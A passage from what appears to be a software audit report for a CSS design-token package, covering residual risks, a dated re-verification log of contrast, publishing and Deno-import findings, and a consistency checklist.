  that also edits the gate could still ship; consumers' lockfiles and the trusted-publisher binding are
  the remaining controls.
- **Accessibility regressions are seasonal and consumer-side.** The gate protects the role values on
  `--bg`, `--surface`, `--lift` and the panels; a component that picks the wrong role (F10) or a new
  surface outside the gate can still regress, which is why the ui real-browser gate matters and should
  spread to the other apps.
- **Docs as contract:** the residual stale examples (F12) are fixed in 0.1.10; the README role table is
  the one most likely to be copied into component code and is checked by hand, not by a gate.
- **Ramp-stop values moved (0.1.10).** Four stops changed by 1–3% (F11). Consumers that hard-code those
  hex values (none found in the workspace; they use the CSS variables) would drift by a barely visible amount.
- **Third-party liveness:** none at runtime. Publishing depends on npm, JSR and GitHub Actions OIDC
  availability only.

---

## Re-verification log

- 2026-10-03 — first-pass baseline at `097b73d` (tag `v0.1.8`, npm 0.1.8 with provenance).
  - **Lenses:** AUDIT_TEMPLATE.md (2026-10-02) + TS (2026-10-03).
  - **Measured:** `check:sync`, `check:versions`, type-check, lint and the audit gate clean (1
    allowlisted dev advisory); pack 7 files.
  - **Contrast:** computed over all role pairings × themes × seasons (scratch script, deleted
    afterwards), confirming F1 and F2.
  - **Probes:** validator probes on a scratch copy (deleted afterwards) confirmed F3 and F4.
  - **Not verified:** JSR state and the Deno import (F5).
  - **Recorded:** F1–F9; OQ1–OQ4.
  - **No findings resolved:** by maintainer instruction this pass only records findings. Remediation,
    including single-solution fixes under the resolve-inline rule, is to be applied separately, with
    each disposition moved to RESOLVED and the diff cited.

- 2026-10-09 — re-verification at `61863ad` (`main`; release tag `v0.1.9` = `db4e3ad`; npm and JSR
  0.1.9). Every finding re-read against the code, CHANGELOG, tests, workflows and `git log`.
  - **Lenses:** AUDIT_TEMPLATE.md (2026-10-08) + TS (2026-10-08). VUE is not triggered; its *Colour &
    links* row is applied as the contrast reference. The Template line, front matter (Deployment
    status, Review date, Status, ceiling), the TS-lens B.1 matrix note, TS-M9 and the Section A TS
    categories were added or refreshed.
  - **Dispositions:** F1, F2 (package scope), F3, F6, F7, F8 RESOLVED in 0.1.9 (`db4e3ad`); F4
    MITIGATED (comments and references fixed; partial JSON mirror accepted); F5 DEFERRED (verified:
    JSR at 0.1.9, but the Deno import of `.` fails — pre-mainnet gate, OQ4); F9 Positive (updated).
    Unsigned tags (F7) ACCEPTED-RISK.
  - **New findings:** F10 (access-gate-ui, dao-ui, treasury-ui still draw `--warning` as text; Low,
    DEFERRED), F11 (the contrast gate omits `--lift` and the panels; 10 light-theme `--lift` pairings
    at 4.30–4.49:1; Info, ACCEPTED-RISK), F12 (residual doc and comment drift; Info, DEFERRED).
  - **Measured:** `npm run check` clean (250 contrast pairings; 25 tests pass), type-check and
    stylelint clean, audit gate 1 allowlisted dev advisory, pack 7 files 14.2 kB; npm `latest` 0.1.9
    with provenance; JSR 0.1.9 (4 versions). The local `node_modules` predate the Dependabot bump (see
    Scope).
  - **Verified live:** `api.jsr.io` (reachable this time) and Deno 2.9.6 in a scratch directory
    (deleted afterwards).
  - **Decisions recorded:** OQ1 (seasons stay on), OQ2 (`--warning-text`), OQ3 (`:root.dark`) decided
    by the 0.1.9 release; OQ4 stays open.
  - **Counts:** 11 dispositioned findings + 1 Positive: 6 RESOLVED (F1, F2, F3, F6, F7, F8), 1
    MITIGATED (F4), 3 DEFERRED (F5, F10, F12), 1 ACCEPTED-RISK (F11).
  - **Not verified:** a clean `npm ci` run from the lockfile and the CI run itself (read, not re-run).

- 2026-10-10 — fix wave on `main` (base `6ec76ff`), release 0.1.10 (local commit, `commit pending`; not
  tagged or published). Node 24.13.0, Deno 2.9.6 (scratch install of the `deno` npm package, outside the
  repo), `jsr` 0.14.3.
  - **Resolved:** F5 (import attribute; entry imported under Node and Deno; CI installs Deno and runs
    `jsr publish --dry-run`; JSR `publish.include`; OQ4 decided: JSR kept), F11 (gate extended to `--lift`
    and the panels, four ramp stops darkened 1–3%), F12 (all five drift items, plus a stale README
    `semantic.light.accent` value found on the way), F4 (full `semantic` role mirror with a completeness
    check, `secondary` / `status` / `radius` exported, `status` deprecated).
  - **Left open:** F10 stays DEFERRED (three call sites in access-gate-ui, dao-ui, treasury-ui; no check in
    this package can see their CSS; `--warning` is now documented "fill only" in `tokens.css`).
    The external review (maintainer item) is untouched.
  - **Tests added:** `tests/check-contrast.test.mjs` (5), `tests/sync-mirror.test.mjs` (4),
    `tests/entry-import.test.mjs` (3): 37 tests in all. Mutation checks: removing the import attribute
    fails all three entry tests; reverting the four stops makes the gate report the ten `--lift` failures.
  - **Measured:** `check:versions` ✓ (0.1.10), `check:sync` ✓, `check:contrast` ✓ (370 pairings),
    `check:css` ✓, `npm test` 37 pass / 0 fail with Deno (`REQUIRE_DENO=1`), type-check ✓, `lint:css` ✓,
    audit gate (1 allowlisted dev advisory, 0 not allowlisted), `npm pack --dry-run` 7 files 15.3 kB,
    `npx --no-install jsr publish --dry-run` ✓ (6 files). esbuild and Vite SSR bundle the entry (scratch).
  - **Counts:** 11 dispositioned findings + 1 Positive: 10 RESOLVED (F1–F8, F11, F12), 1 DEFERRED (F10).
    Unsigned tags (F7) remain an accepted risk inside F7.
  - **Not verified:** the GitHub Actions run of the new Deno and dry-run steps (the `setup-deno` SHA is the
    v2.0.5 tag commit, read via the GitHub API); consumers at 0.1.10 (the orchestrator releases).

## Pre-save consistency checklist (this pass)

- [x] Section A ↔ findings: every row HOLDS; the only caveat left cites F10.
- [x] Finding header ↔ body: consistent; first-pass remediation text kept, with a dated re-verification
  paragraph under each.
- [x] Template line: base + TS with registry dates (2026-10-08); untriggered lenses named; VUE
  contrast row applied by reference.
- [x] Closing four-part structure present, in order.
- [x] Open questions stay listed; OQ1–OQ4 carry their decision and date.
- [x] Section D ↔ dispositions: ticked only for RESOLVED/MITIGATED items; unticked items cite F10 or the
  external review.
- [x] Executive summary ↔ dispositions and ceiling (Medium; realised Low).
- [x] C.1 re-counted 2026-10-10 (37 tests).
- [x] B.1 versions match `package.json` and the lockfile; deployment status matches npm and JSR.
- [x] Re-verification log entry added (2026-10-09 and 2026-10-10).
